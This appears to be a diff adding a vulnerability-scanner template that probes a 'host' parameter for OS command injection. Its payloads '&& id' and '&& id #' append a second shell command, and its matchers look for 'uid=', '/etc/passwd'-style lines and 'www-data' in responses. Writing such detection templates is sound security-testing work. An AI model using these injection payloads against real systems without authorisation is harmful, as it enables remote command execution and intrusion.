@@ -1,0 +1,25 @@
+id: cmdi-059
+name: 'OS command injection via host'
+severity: critical
+type: active
+tags:
+  - cmdi
+  - injection
+  - rce
+description: 'OS command runs via host'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      host:
+        - '&& id'
+        - '&& id #'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
+          - 'root:x:0:0'
+          - 'bin/bash'
+          - 'www-data'
